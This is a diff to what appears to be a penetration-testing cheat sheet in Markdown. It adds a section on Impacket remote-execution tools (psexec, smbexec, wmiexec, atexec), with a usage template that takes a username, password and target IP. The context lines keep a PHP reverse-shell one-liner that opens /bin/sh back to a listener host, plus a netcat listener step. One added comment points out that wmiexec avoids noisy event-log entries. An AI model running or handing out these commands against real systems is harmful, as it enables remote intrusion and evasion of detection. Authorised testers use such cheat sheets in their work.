@@ -508,12 +508,6 @@ ls -alhR /opt/lampp/htdocs/ 2>/dev/null
 ```
 <br />
 
-# Impacket Tools
-
-
-
-<br />
-
 # Reverse Shell
 
 ## NC Listen - Client [STEP 1]
@@ -564,6 +558,28 @@ php -r ‘$sock=fsockopen(“{IP ADDRESS}”,{PORT});exec(“/bin/sh -i <&3 >&3 
 # {PORT}: Port of the client from step one (listener)
 ```
 <br />
+ 
+### Impacket Remote Code Execution
+
+```bash
+# atexec.py : Atexec.py: Impacket has a python library that helps an attacker to access the victim host machine remotely through DCE/RPC based protocol used by CIFS hosts to access/control the AT-Scheduler Service and execute the arbitrary system command.
+
+# PsExec.py : PSEXEC like functionality example using RemComSvc, with the help of python script we can use this module for connecting host machine 
+
+# netview.py : It is an enumeration tool. It requires the domain name to enumerate hosts. It can also be provided with a list of hosts or targets
+
+# Smbexec.py : Smbexec.py uses a similar approach to psexec w/o using RemComSvc
+
+# wmiexec.py : A similar approach to smbexec but executing commands through WMI. The main advantage here is it runs under the user (has to be Admin) account, not SYSTEM, plus, it doesn’t generate noisy messages in the event log that smbexec.py does when creating a service.
+
+# Usage
+/usr/share/doc/python3-impacket/examples/{IMPACKET.py} {USERNAME}:{PASSWORD}@{IP ADDRESS}
+
+# {USERNAME}: Valid Windows username
+# {PASSWORD}: Valid Windows password
+# {IP ADDRESS}: Server IP address
+```
+
 
 ## Reverse Shell Generator
 
